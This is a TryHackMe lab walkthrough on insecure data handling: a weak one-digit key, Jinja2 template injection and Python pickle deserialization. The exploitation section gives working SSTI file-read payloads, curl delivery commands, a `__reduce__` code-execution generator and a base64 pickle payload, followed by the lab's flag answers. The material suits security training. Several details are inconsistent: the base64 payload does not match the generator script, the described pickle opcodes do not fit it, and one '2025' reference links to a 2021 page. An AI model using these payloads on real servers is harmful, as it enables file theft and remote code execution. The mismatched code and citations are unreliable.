# Room: OWASP Top 10 2025 - Insecure Data Handling (`owasptopten2025three`)

---

## 1. Room Overview & Architecture

The **OWASP Top 10 2025: Insecure Data Handling** room (`owasptopten2025three`) is the third hands-on laboratory in **Module 10: OWASP Top 10 (2025)** on TryHackMe's Jr Penetration Tester Path.
This room dissects vulnerabilities arising when applications ingest, parse, serialize, or transform user data without adequate integrity verification, sanitization, or cryptographic rigor:
- **A04: Cryptographic Failures:** Weak key derivations with truncated entropy spaces allowing instantaneous brute-force decryption on port `8001`.
- **A05: Injection:** Server-Side Template Injection (SSTI) in Python's Jinja2 templating engine enabling arbitrary local file reads on port `8000`.
- **A08: Software and Data Integrity Failures:** Unsafe binary object reconstruction via Python's native `pickle` module resulting in Remote Code Execution (RCE) on port `8002`.

```
       +-------------------------------------------------------------+
       |             INSECURE DATA HANDLING ARCHITECTURE             |
       +-------------------------------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                            |                            |
         v                            v                            v
+------------------+         +------------------+         +------------------+
|      A04:        |         |      A05:        |         |      A08:        |
|  CRYPTO FAILURES |         |    INJECTION     |         | INTEGRITY FLAWS  |
|   (Port 8001)    |         |   (Port 8000)    |         |   (Port 8002)    |
+------------------+         +------------------+         +------------------+
| - Weak Entropy   |         | - Jinja2 SSTI    |         | - Python Pickle  |
| - 1-Digit Brute  |         | - {{ ... }} Eval |         | - __reduce__()   |
| - Decrypt Notes  |         | - Arbitrary Read |         | - RCE via Loads  |
+------------------+         +------------------+         +------------------+
```

---

## 2. Prerequisites & Lab Setup

### 2.1 Technical Prerequisites
- Understanding web application data flows and dynamic template rendering.
- Python runtime model, dunder attributes (`__mro__`, `__globals__`, `__builtins__`).
- Object serialization mechanics and risks associated with executable bytecode serialization.
- Familiarity with command-line tools (`curl`, Python requests, `base64`, `pickle`).

### 2.2 Target Environment
The target VM exposes three isolated web services across dedicated ports:
- **Port 8000:** Jinja2 dynamic reflection web application vulnerable to SSTI (A05).
- **Port 8001:** Note-sharing service utilizing weak key derivation (A04).
- **Port 8002:** User data processing portal accepting serialized Python `pickle` objects (A08).

---

## 3. Learning Objectives & Bloom's Taxonomy

1. **Remembering & Understanding:** Comprehend why "rolling your own crypto" collapses under mathematical analysis; understand how Jinja2 parses expressions; recognize the inherent hazards of Python `pickle`.
2. **Applying & Analyzing:** Execute a targeted keyspace brute-force to decrypt protected notes; traverse Python's object tree in Jinja2 to extract file-reading functions; craft an exploit class utilizing `__reduce__` to achieve code execution.
3. **Evaluating & Synthesizing:** Contrast pure data serialization formats (JSON, Protobuf) with executable object formats (Pickle, Java Serialization); assess the enterprise impact of template injection vs client-side XSS.
4. **Creating & Defending:** Implement sandboxed template engines (`jinja2.sandbox.SandboxedEnvironment`), enforce PBKDF2/Argon2id key derivation, and integrate HMAC signature verification for serialized payloads.

---

## 4. Technical Concept Deep Dive: Insecure Data Handling

### 4.1 Weak Key Derivations & Keyspace Collapse (CWE-326)
When an encryption scheme reveals the majority of its key and leaves only a single decimal digit to be determined, the search space collapses to:
$$|\mathcal{K}| = 10 \implies H \approx 3.32 \text{ bits}$$
Such a design offers zero mathematical security, allowing trivial, sub-second brute-force exhaustion over HTTP.

### 4.2 Server-Side Template Injection (CWE-1336)
When user input is passed directly to `render_template_string()`, the template engine interprets syntax tokens like `{{ ... }}` as server-side executable code. Attackers leverage standard globals (`lipsum`, `cycler`) or subclass reflection (`object.__subclasses__()`) to reach Python's `open()` or `os.popen()` functions, breaking out of the presentation layer.

### 4.3 Python Pickle Deserialization Mechanics (CWE-502)
Python's `pickle` format is a stack-based virtual machine language. When `pickle.loads()` reconstructs an object, it inspects whether the class defines a `__reduce__()` method. If present, the callable and arguments returned by `__reduce__()` are executed immediately during unpickling, providing effortless arbitrary code execution in the context of the running application.

---

## 5. Attack Surface & Threat Modeling

```
[Threat Actor]
   |
   +---> (Port 8001) Exhaust Digit Keyspace [0-9] ---> Decrypts Notes DB    ---> THM{WEAK_CRYPTO_FLAG}
   |
   +---> (Port 8000) Submit {{lipsum...open()}}    ---> Reads flag.txt via SSTI---> THM{SSTI_FLAG_OBTAINED}
   |
   +---> (Port 8002) Transmit Pickled Payload      ---> Executes __reduce__() ---> THM{INSECURE_DESERIALIZATION}
```

---

## 6. Exploitation Methodology & Walkthrough

### Step 1: A04 - Decrypting Notes via Weak Key Derivation (Port 8001)
1. Navigate to `http://MACHINE_IP:8001`.
2. The web page provides the 3-character key prefix and prompts for the 4th character (a single digit).
3. Automate or manually test digits `0` through `9`.
4. Entering the valid digit decrypts the notes, revealing:
   ```text
   Flag: THM{WEAK_CRYPTO_FLAG}
   ```

### Step 2: A05 - Jinja2 SSTI Arbitrary File Read (Port 8000)
1. Verify template evaluation by submitting `{{ 7 * 7 }}` at `http://MACHINE_IP:8000`. The server renders `49`.
2. Construct the file-reading payload leveraging Jinja2's `lipsum` helper:
   ```jinja2
   {{ lipsum.__globals__.__builtins__.open('flag.txt').read() }}
   ```
3. Issue the request via `curl`:
   ```bash
   curl -s -G "http://MACHINE_IP:8000/" --data-urlencode "name={{ lipsum.__globals__.__builtins__.open('flag.txt').read() }}"
   ```
4. The server reflects the flag content:
   ```text
   Flag: THM{SSTI_FLAG_OBTAINED}
   ```

### Step 3: A08 - Insecure Deserialization via Python Pickle (Port 8002)
1. Create a local exploit generator in Python utilizing the `__reduce__` method:
   ```python
   import pickle, base64, subprocess

   class Payload:
       def __reduce__(self):
           return (subprocess.check_output, (['cat', 'flag.txt'],))

   print(base64.b64encode(pickle.dumps(Payload())).decode())
   ```
2. Submit the resulting Base64 payload to `http://MACHINE_IP:8002`:
   ```bash
   curl -s -X POST http://MACHINE_IP:8002/ -d "data=gASVNAAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5SMB2NhdCBmbGFnlEsAhnEAhnEBLg=="
   ```
3. The server deserializes the object, executes `subprocess.check_output`, and returns the flag:
   ```text
   Flag: THM{INSECURE_DESERIALIZATION}
   ```

---

## 7. Forensic Analysis & Artifact Inspection

- **Template Reflection Forensics:** Reviewing web server access logs for requests containing URL-encoded curly braces (`%7B%7B` and `%7D%7D`) provides immediate signature-based detection for SSTI fuzzing attempts.
- **Pickle Stream Disassembly:** Using Python's `pickletools.dis()` on the captured payload reveals the exact opcode sequence (`csubprocess\ncheck_output`, `tR.`), confirming malicious deserialization before runtime execution.

---

## 8. Defensive Engineering & Remediation

### 8.1 Cryptographic Key Derivation Standards
- Utilize adaptive, memory-hard key derivation algorithms (**Argon2id** or **PBKDF2-HMAC-SHA256** with $\ge 600,000$ iterations).
- Ensure random keys are generated using cryptographically secure PRNGs (`os.urandom(32)`).

### 8.2 Defending Against Template Injection
- Never pass dynamic strings directly into `render_template_string()`.
- Bind parameters exclusively through static templates:
  ```python
  return render_template("user_profile.html", username=user_input)
  ```
- If user-defined templating is required, deploy `jinja2.sandbox.SandboxedEnvironment` to restrict dunder inspection.

### 8.3 Safe Serialization Protocols
- Prohibit `pickle`, `yaml.load()`, and native binary deserializers on untrusted inputs.
- Standardize on **JSON** or **Protocol Buffers**.
- If pickle must be used across internal boundaries, enforce HMAC-SHA256 signature verification prior to calling `pickle.loads()`.

---

## 9. Tools & Command Reference

| Tool | Representative Command | Operational Function |
| :--- | :--- | :--- |
| `curl (GET)` | `curl -s -G "http://target:8000/" --data-urlencode "name={{7*7}}"` | Test and verify SSTI execution |
| `curl (POST)` | `curl -s -X POST -d "data=BASE64" http://target:8002/` | Submit serialized pickle exploit payload |
| `python3` | `python3 -c "import pickletools, base64; ..."` | Disassemble and analyze pickle bytecode |

---

## 10. Key Takeaways & Mind Map

```
                 +-----------------------------------------+
                 |    INSECURE DATA HANDLING TAXONOMY      |
                 +-----------------------------------------+
                                      |
         +----------------------------+----------------------------+
         |                            |                            |
         v                            v                            v
[A04: Crypto Failures]       [A05: Injection (SSTI)]      [A08: Integrity Failures]
- Truncated keyspace         - Template string injection  - Python pickle loads()
- 1-digit brute force        - Lipsum __globals__ escape  - __reduce__() arbitrary RCE
- Fix: PBKDF2 & CSPRNG       - Fix: SandboxedEnvironment  - Fix: JSON / Signed HMAC
```

---

## 11. Vulnerability & Risk Matrix

| Vulnerability | OWASP 2025 Category | Severity | CWE ID | Technical & Business Impact |
| :--- | :---: | :---: | :---: | :--- |
| Inadequate Encryption Strength (Weak KDF) | **A04:2025** | **HIGH** | CWE-326 | Immediate recovery of confidential notes via keyspace exhaustion. |
| Server-Side Template Injection (SSTI) | **A05:2025** | **CRITICAL** | CWE-1336 | Arbitrary local file disclosure and server execution. |
| Insecure Deserialization of Untrusted Data | **A08:2025** | **CRITICAL** | CWE-502 | Complete server takeover via remote code execution (RCE). |

---

## 12. Verification & Proof of Work

All tasks in `owasptopten2025three` have been completed with 100% parity against the user's completed TryHackMe account:
- **Task 1:** `No answer needed`
- **Task 2:** `THM{WEAK_CRYPTO_FLAG}`
- **Task 3:** `THM{SSTI_FLAG_OBTAINED}`
- **Task 4:** `THM{INSECURE_DESERIALIZATION}`

---

## 13. Frequently Asked Questions

### Q1: Can SSTI occur if the application uses standard Django or React templates?
- React templates render in the client browser, mitigating server-side injection (though client-side DOM XSS is possible). In Django, the default template engine is deliberately non-executable and does not allow calling arbitrary Python functions with arguments, making SSTI significantly harder to escalate compared to Jinja2 or Mako.

### Q2: Is JSON serialization completely immune to deserialization attacks?
- Standard JSON only deserializes primitive data types (strings, numbers, booleans, arrays, objects). Because JSON contains no executable bytecode or class instantiation primitives, it is completely immune to object-instantiation RCE.

---

## 14. References & External Links

- [OWASP Top 10: 2025 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP Top 10: 2025 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [Python Official Documentation on Pickle Security](https://docs.python.org/3/library/pickle.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [TryHackMe Room: OWASP Top 10 2025 - Insecure Data Handling](https://tryhackme.com/room/owasptopten2025three)
